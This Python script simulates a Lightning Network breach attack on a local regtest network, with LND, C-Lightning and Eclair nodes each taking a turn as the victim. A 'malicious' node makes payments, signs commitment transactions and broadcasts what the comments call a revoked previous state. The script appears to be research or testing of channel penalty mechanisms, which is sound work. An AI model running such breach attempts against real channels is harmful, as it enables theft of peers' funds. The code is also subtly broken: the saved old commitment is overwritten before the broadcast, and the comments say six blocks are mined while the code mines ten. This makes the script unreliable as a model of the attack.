from conf import *
from DockerManager import DockerManager
from datetime import datetime


#INITIAL GLOBAL VARIABLES

DOCKER_MANAGER = DockerManager()
NODE_LIST = DOCKER_MANAGER.nodes
DATE = datetime.now()
#FOLDER = RESULTS_PATH + str(DATE.day) + '_' + str(DATE.month) + '_' + str(DATE.hour) + str(DATE.minute) + str(DATE.second)
import os
#os.mkdir(FOLDER)


def LND():

	#SIMPLE CONTRACT BREACH ATTACK SIMULATION ON LND VICTIM
	#ASSIGN POLAR SCENARIO TO 1


	# 1. Identify all nodes and save in easy variables to use
	for i in NODE_LIST:
		if i.implementation == 'lnd':
			victim = i
		elif i.implementation == 'lightningd':
			malicious = i
		else:
			bitcoin_core = i

	# 2. Get Funding Transaction id and raw

	fundingTransactionID = victim.getFundingTransactionID()
	fundingTransactionRAW = bitcoin_core.getRawTransaction(fundingTransactionID)
	
	# 2. Initialize the results file

	FOLDER = RESULTS_PATH + 'victim_LND'
	os.mkdir(FOLDER)
	file_name = FOLDER + '/results.txt'
	f = open(file_name, "w")
	f.write("LND VICTIM NODE IMPLEMENTATION\n")
	f.write("SIMULTAION TIME " + str(DATE) +'\n')

	f.write("\n\nFunding Transaction: \n")
	f.write("   " + fundingTransactionRAW + "\n\n\n")


	victimBalance = 0
	maliciousBalance = 250000
	f.write("INITIAL STATE:\n")
	f.write("Victim balance: " + str(victimBalance) + '\n')
	f.write("Malicious balance: " + str(maliciousBalance) + '\n')

	
	# 3. Malicious pays 100k sats to victim

	invoice = victim.createInvoice(100000)
	res = malicious.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance += 100000
	maliciousBalance -= 100000
	f.write("\n\nMalicious pays 100k sats to victim\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")

	peerId = malicious.getPeersIds()[0]
	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)


	# 4. Victim pays 50k sats to malicious
	invoice = malicious.createInvoice(50000)
	res = victim.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance -= 50000
	maliciousBalance += 50000
	f.write("\n\nVictim pays 50k sats to malicious\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	


	# 5. Malicious save this commitment transaction
	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)


	#6. Malicous pays 40k sats to victim
	invoice = victim.createInvoice(40000)
	res = malicious.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance += 40000
	maliciousBalance -= 40000
	f.write("\n\nMalicious pays 40k sats to victim\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	

	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)

	#7. Malicious broadcast previous state
	res = bitcoin_core.sendRawTransaction(commitmentTx)
	f.write("\n\nMalicious broadcast previous state\n")
	f.write("  Commitment transaction hash in hex: \n  " + res)


	#8. Mine 6 blocks to get the last tx confirmed
	blocksHahs = bitcoin_core.mineNewBlocks(10)
	f.write("\n\nBlocks hashes\n")
	f.write('\n'.join(blocksHahs))

	f.close()
	

def CLightning():

	#SIMPLE CONTRACT BREACH ATTACK SIMULATION ON C-Lightning VICTIM
	#ASSIGN POLAR SCENARIO TO 2


	# 1. Identify all nodes and save in easy variables to use
	for i in NODE_LIST:
		if i.implementation == 'lightningd':
			if i.name == 'polar-n2-bob':
				malicious = i
			else:
				victim = i
		else:
			bitcoin_core = i

	# 2. Get Funding Transaction id and raw

	fundingTransactionID = victim.getFundingTransactionID()
	fundingTransactionRAW = bitcoin_core.getRawTransaction(fundingTransactionID)
	

	# 2. Initialize the results file
	FOLDER = RESULTS_PATH + 'victim_CLightning'
	os.mkdir(FOLDER)
	file_name = FOLDER + '/results.txt'
	f = open(file_name, "w")
	f.write("C-Lightning VICTIM NODE IMPLEMENTATION\n")
	f.write("SIMULTAION TIME " + str(DATE) +'\n')

	f.write("\n\nFunding Transaction: \n")
	f.write("   " + fundingTransactionRAW + "\n\n\n")

	victimBalance = 0
	maliciousBalance = 250000
	f.write("INITIAL STATE:\n")
	f.write("Victim balance: " + str(victimBalance) + '\n')
	f.write("Malicious balance: " + str(maliciousBalance) + '\n')

	
	# 3. Malicious pays 100k sats to victim

	invoice = victim.createInvoice(100000)
	res = malicious.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance += 100000
	maliciousBalance -= 100000
	f.write("\n\nMalicious pays 100k sats to victim\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")

	peerId = malicious.getPeersIds()[0]
	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)


	# 4. Victim pays 50k sats to malicious
	invoice = malicious.createInvoice(50000)
	res = victim.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance -= 50000
	maliciousBalance += 50000
	f.write("\n\nVictim pays 50k sats to malicious\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	


	# 5. Malicious save this commitment transaction
	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)


	#6. Malicous pays 40k sats to victim
	invoice = victim.createInvoice(40000)
	res = malicious.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance += 40000
	maliciousBalance -= 40000
	f.write("\n\nMalicious pays 40k sats to victim\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	

	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)

	#7. Malicious broadcast previous state
	res = bitcoin_core.sendRawTransaction(commitmentTx)
	f.write("\n\nMalicious broadcast previous state\n")
	f.write("  Commitment transaction hash in hex: \n  " + res)


	#8. Mine 6 blocks to get the last tx confirmed
	blocksHahs = bitcoin_core.mineNewBlocks(10)
	f.write("\n\nBlocks hashes\n")
	f.write('\n'.join(blocksHahs))

	f.close()


def Eclair():

	#SIMPLE CONTRACT BREACH ATTACK SIMULATION ON ECLAIR VICTIM
	#ASSIGN POLAR SCENARIO TO 3


	# 1. Identify all nodes and save in easy variables to use
	for i in NODE_LIST:
		if i.implementation == 'polar-eclair':
			victim = i
		elif i.implementation == 'lightningd':
			malicious = i
		else:
			bitcoin_core = i

	# 2. Get Funding Transaction id and raw

	fundingTransactionID = victim.getFundingTransactionID()
	fundingTransactionRAW = bitcoin_core.getRawTransaction(fundingTransactionID)
	

	# 2. Initialize the results file
	FOLDER = RESULTS_PATH + 'victim_Eclair'
	os.mkdir(FOLDER)
	file_name = FOLDER + '/results.txt'
	f = open(file_name, "w")
	f.write("ECLAIR VICTIM NODE IMPLEMENTATION\n")
	f.write("SIMULTAION TIME " + str(DATE) +'\n')

	f.write("\n\nFunding Transaction: \n")
	f.write("   " + fundingTransactionRAW + "\n\n\n")

	victimBalance = 0
	maliciousBalance = 250000
	f.write("INITIAL STATE:\n")
	f.write("Victim balance: " + str(victimBalance) + '\n')
	f.write("Malicious balance: " + str(maliciousBalance) + '\n')

	
	# 3. Malicious pays 100k sats to victim

	invoice = victim.createInvoice(100000)
	res = malicious.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance += 100000
	maliciousBalance -= 100000
	f.write("\n\nMalicious pays 100k sats to victim\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")

	peerId = malicious.getPeersIds()[0]
	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)


	# 4. Victim pays 50k sats to malicious
	invoice = malicious.createInvoice(50000)
	res = victim.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance -= 50000
	maliciousBalance += 50000
	f.write("\n\nVictim pays 50k sats to malicious\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	


	# 5. Malicious save this commitment transaction
	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)


	#6. Malicous pays 40k sats to victim
	invoice = victim.createInvoice(40000)
	res = malicious.payInvoice(invoice)
	if res:
		print('Payment completed')

	victimBalance += 40000
	maliciousBalance -= 40000
	f.write("\n\nMalicious pays 40k sats to victim\n")
	f.write("  Victim balance: " + str(victimBalance) + "\n")
	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	

	commitmentTx = malicious.signLastTx(peerId)
	f.write("  Commitment raw TX: \n   " + commitmentTx)

	#7. Malicious broadcast previous state
	res = bitcoin_core.sendRawTransaction(commitmentTx)
	f.write("\n\nMalicious broadcast previous state\n")
	f.write("  Commitment transaction hash in hex: \n  " + res)


	#8. Mine 6 blocks to get the last tx confirmed
	blocksHahs = bitcoin_core.mineNewBlocks(10)
	f.write("\n\nBlocks hashes\n")
	f.write('\n'.join(blocksHahs))

	f.close()


if __name__ == "__main__":
	Eclair()